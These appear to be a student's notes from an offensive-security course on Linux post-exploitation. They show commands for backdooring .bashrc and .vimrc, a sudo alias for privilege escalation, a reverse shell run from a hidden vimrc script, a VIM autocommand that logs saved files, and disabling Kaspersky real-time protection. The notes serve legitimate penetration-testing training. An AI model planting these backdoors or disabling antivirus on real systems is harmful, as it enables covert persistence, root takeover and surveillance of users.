# Linux post exploitation

372

linux is used on server

# user configuration files

dotfiles

.bash_profile and .bashrc - to put environement variables and load scripts whene a user initially logs onto a system

```
 echo "touch /tmp/bashtest.txt" >> ~/.bashrc
```

# VIM Config Simple Backdoor

vimrc in .vimrc file comtains the configuration file for vim

`echo ":echo 'this is a test'" >> .vimrc`

`echo "!touch /tmp/test.txt" >> .vimrc`

we can source a shell script using the bash source command.

we can import other vim configuration files into users cuirrent duir with source command we add silent so that the script is not shown.

`echo ':silent !source ~/.vimrunscript' >> .vimrc`
we create a shell script file /home/offsec/.vimrunscript `echo "hacked" >  /tmp/hacksrcout.txt`

we can add alias into the .bashrc file

`echo 'alias sudo="sudo -E"' >> ~/.bashrc`

`source ~/.bashrc` for making effect the changes

we can look at file permission through 

`sudo -l`


### 10.1.1.1 Exercises
1. Backdoor VIM as described in the module by modifying the user’s .vimrc file directly and 
running a command while silencing the output.

2. Backdoor VIM by adding a script to the VIM plugins folder.

3. Backdoor VIM by sourcing a secondary shell script in the user’s .vimrc file while silencing the 
output.
4. Create an alias for the user for sudo to preserve the user’s environment and activate it by 
sourcing the user’s .bashrc file. Then execute a command as root by running VIM as sudo.
5. Using the linuxvictim user, run VIM via sudo and get a root shell using the :shell command.

all exercises done

### 10.1.1.2 Extra Mile
Get a reverse shell using the above VIM backdoor as root.

```sh
└─$ cat vimrunscript 
#!/bin/bash
echo "hacked" > /tmp/hacksrcout.txt
~/reverse.elf 
```

```sh
┌──(kali㉿kali)-[~]
└─$ cat .vimrc
:silent !source ~/vimrunscript  
```

# vim config keylogger

we leverage autocommands 
:autocmd

`:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt`

we can also add it in 

` /home/offsec/.vim/plugin/settings.vim`

we can put an if condition

```
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```

### 10.1.2.1 Exercises
1. Use an autocommand call to write a simple VIM keylogger and silence it as in this section, 
sourcing it from a separate file than the user’s .vimrc file.

2. Modify the keylogger to only log modified file contents if the user is root

# bypassing AV

linux kaspersky

# Kaspersky Endpoint security

We can turn Kaspersky off using the kesl-control utility. We need to use the --stop-t flag, 
which stops a specified task number

`sudo kesl-control --stop-t 1`

We can turn Kaspersky off using the kesl-control utility. We need to use the --stop-t flag, 
which stops a specified task number. The documentation indicates that real-time protection runs 
as task number 1

`sudo gpg -d eicar.txt.gpg > eicar.txt`

`sudo kesl-control --scan-file ./eicar.txt`

`sudo kesl-control -E --query | grep DetectName`

394

# Shared libraries




